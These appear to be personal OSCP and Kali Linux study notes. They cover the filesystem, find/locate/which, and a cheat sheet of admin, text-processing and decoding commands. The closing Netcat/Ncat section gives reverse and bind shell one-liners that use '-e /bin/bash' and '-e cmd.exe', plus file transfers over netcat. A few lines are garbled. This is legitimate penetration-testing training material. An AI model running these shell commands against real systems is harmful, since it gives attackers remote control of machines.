# The Linux Filesystem

Kali Linux adheres to the filesystem hierarchy standard (FHS),35 which provides a 
familiar and universal layout for all Linux users. The directories you will find most useful are:


• /bin - basic programs (ls, cd, cat, etc.)

• /sbin - system programs (fdisk, mkfs, sysctl, etc)

• /etc - configuration files

• /tmp - temporary files (typically deleted on boot)

• /usr/bin - applications (apt, ncat, nmap, etc.)

• /usr/share - application support and data files


# manual pages about a command 
man ls 
Most executable programs intended for the Linux command line provide a 
formal piece of documentation often called manual or man pages.36 A special program called man is used to view these pages.



# Listing Files
The ls command prints out a basic file listing to the screen. We can modify the output results with various wildcards. 
The -a option is used to display all files (including hidden ones) and the -1 option displays each file on a single line, 
which is very useful for automation.

ls -a 



# Moving Around
Linux does not use Windows-style drive letters. Instead, all files, folders, and devices are children of the root directory, 
represented by the “/” character. We can use the cd command followed by a path to change to the specified directory. 
The pwd command will print the current directory (which is helpful if you get lost) and running cd ~ will return to the home directory.



# Creating Directories
The mkdir command followed by the name of a directory creates the specified directory. 
Directory names can contain spaces but since we will be spending a lot of time at the command line, 
we’ll save ourselves a lot of trouble by using hyphens or underscores instead. 
These characters will make auto-completes (executed with the A key) much easier to complete.




# Finding Files in Kali Linux
Three of the most common Linux commands used to locate files in Kali Linux include find, locate, and which. 
These utilities have similarities, but work and return data in different ways and therefore may be used in different circumstances.


## which
The which command39 searches through the directories that are defined in the $PATH environment variable for a given file name. 
This variable contains a listing of directories that Kali searches when a command is issued without its path. If a match is found, 
which returns the full path to the file as shown below:

kali@kali:~$ which sbd

/usr/bin/sbd


## locate
Exploring the which command
The locate command is the quickest way to find the locations of files and directories in Kali. In order to provide a much shorter search time, locate searches a built-in database named locate.db rather than the entire hard disk itself. This database is automatically updated on a regular basis by the cron scheduler. To manually update the locate.db database, you can use the updatedb command.

kali@kali:~$ locate sbd.exe 

/usr/share/windows-resources/sbd/sbd.exe



## find
The find command41 is the most complex and flexible search tool among the three. Mastering its syntax can sometimes be tricky, but its capabilities go beyond a normal file search. The most basic usage of the find command is shown in Listing 14, where we perform a recursive search starting from the root file system directory and look for any file that starts with the letters “sbd”.


kali@kali:~$ sudo find / -name sbd*

/usr/bin/sbd
/usr/share/doc/sbd /usr/share/windows-resources/sbd /usr/share/windows-resources/sbd/sbd.exe /usr/share/windows-resources/sbd/sbdbg.exe /var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb /var/lib/dpkg/info/sbd.md5sums /var/lib/dpkg/info/sbd.list








The below commands will list all .txt files to identify the flags. Used in several CTFs and useful for the OSCP challenge.
WINDOWS

(for /R ".\" %A in (*.txt) do echo %~fA %~zA) | findstr /v "echo

LINUX 

“ind . -type f -name "*.txt"
====================================

Vim cheat sheet 
https://vim.rtorr.com/
====================================

Set the Target IP Address to the $ip system variable
export ip=192.168.1.100
====================================

Find location of file
locate sbd.exe
====================================

Search through dirs in the $PATH environment variable
which sbd
====================================

Find a search for a file that contains a specific string in it’s name:
find / -name sbd\*
====================================

Show active internet connections
netstat -a
====================================

Change Password
passwd
====================================

Verify a service is running and listening
netstat -antp |grep <servicename>
====================================

Start a service
systemctl start ssh

systemctl start apache2

Have a service start at boot
systemctl enable ssh

Stop a service
systemctl stop ssh
====================================

Unzip a gz file
gunzip access.log.gz

Unzip a tar.gz file
tar -xzvf file.tar.gz
====================================

Search command history
history | grep phrase_to_search_for
====================================

Download a webpage
wget http://www.cisco.com
====================================

Open a webpage
curl http://www.cisco.com ( -v)
====================================

String manipulation

    Count number of lines in file
    wc -l index.html

    Get the start or end ohead f a file
    head index.html

    tail index.html

    Extract all the lines that contain a string
    grep "href=" index.html

    Cut a string by a delimiter, filter results then sort
    grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u

    Using Grep and regular expressions and output to a file
    cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt

    Use a bash loop to find the IP address behind each host
    for url in $(cat list.txt); do host $url; done

    Collect all the IP Addresses from a log file and sort by frequency
    cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
====================================

Decoding using Kali

    Decode Base64 Encoded Values

    echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

    Decode Hexidecimal Encoded Values
    echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
====================================

Netcat - Read and write TCP and UDP Packets

    Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems): https://joncraton.org/blog/46/netcat-for-windows/

    Connect to a POP3 mail server
    nc -nv $ip 110

    Listen on TCP/UDP port
    nc -nlvp 4444

    Connect to a netcat port
    nc -nv $ip 4444

    Send a file using netcat
    nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe

    Receive a file using netcat
    nc -nlvp 4444 > incoming.exe

    Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...

    whereis nc
    nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

    /bin/nc.traditional -e /bin/bash 1.2.3.4 4444

    Create a reverse shell with Ncat using cmd.exe on Windows
    nc.exe -nlvp 4444 -e cmd.exe

    or

    nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe

    Create a reverse shell with Ncat using bash on Linux
    nc -nv $ip 4444 -e /bin/bash

    Netcat for Banner Grabbing:

    echo "" | nc -nv -w1 <IP Address> <Ports>

Ncat - Netcat for Nmap project which provides more security avoid IDS

    Reverse shell from windows using cmd.exe using ssl
    ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl

    Listen on port 4444 using ssl
    ncat -v $ip 4444 --ssl

